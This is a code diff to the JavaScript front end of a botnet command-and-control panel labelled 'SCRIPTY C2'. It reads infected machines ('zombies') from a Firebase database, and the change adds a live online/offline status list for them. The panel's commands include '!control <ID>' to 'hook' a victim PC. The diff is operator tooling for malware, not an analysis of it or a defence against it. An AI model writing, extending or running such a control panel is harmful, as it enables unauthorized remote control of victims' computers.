@@ -345,20 +345,51 @@
             termOut.appendChild(d);
             termOut.scrollTop = termOut.scrollHeight;
         }
+        function printPCList() {
+            termOut.innerHTML = ''; 
+            print("━━━ ZOMBIE NETWORK STATUS ━━━", "log-warn");
+            
+            if (pcArray.length === 0) {
+                print("No targets found in database.", "log-err");
+                return;
+            }
 
-        // TARGETS
+            pcArray.forEach((pc, idx) => {
+                const lastSeen = onlineStatus[pc.name]?.last_seen || 0;
+                const timeDiff = Date.now() - lastSeen;
+                
+                const isOnline = timeDiff < 20000; 
+                
+                const statusText = isOnline ? "🟢 ONLINE" : "🔴 OFFLINE";
+                const colorClass = isOnline ? "log-num" : "log-err";
+                
+                print(`  [${idx + 1}] ${pc.name.padEnd(15)} ${statusText}`, colorClass);
+            });
+            
+            print("-----------------------------", "log-info");
+            print("Use: !control <number>", "log-info");
+        }
+
+        let onlineStatus = {};
         function loadTargets() {
             get(child(ref(db), `discord_structure`)).then((snapshot) => {
                 if (snapshot.exists()) {
                     const data = snapshot.val();
                     pcList = data.structure || data;
                     buildPCArray();
-                    print("Database loaded.", "log-info");
                 }
             });
+
+            onValue(ref(db, 'status'), (snapshot) => {
+                if (snapshot.exists()) {
+                    onlineStatus = snapshot.val();
+                }
+            });
+            
+            print("Database connection established.", "log-sys");
         }
 
-        // BUILD NUMBERED PC ARRAY
+
         function buildPCArray() {
             pcArray = [];
             for (const [srv, cats] of Object.entries(pcList)) {
@@ -369,7 +400,6 @@
             }
         }
 
-        // COMMANDS
         function runCmd(raw) {
             const parts = raw.split(" ");
             const cmd = parts[0].toLowerCase();
@@ -383,7 +413,7 @@
 ║       SCRIPTY C2 COMMANDS         ║
 ╚═══════════════════════════════════╝
 
-TARGET CONTROL:
+⚙️TARGET CONTROL:
   !list              - Show Zombies (Numbered)
   !control <ID>      - Hook PC by Number
   !status            - Current Info
@@ -431,15 +461,7 @@ TARGET CONTROL:
             }
 
             if(cmd === '!list') {
-                print("━━━ ACTIVE ZOMBIES ━━━", "log-warn");
-                if(pcArray.length === 0) {
-                    print("No targets found.", "log-err");
-                    return;
-                }
-                pcArray.forEach((pc, idx) => {
-                    print(`  [${idx + 1}] ${pc.name}`, "log-num");
-                });
-                print("Use: !control <number>", "log-info");
+                printPCList();
                 return;
             }
 
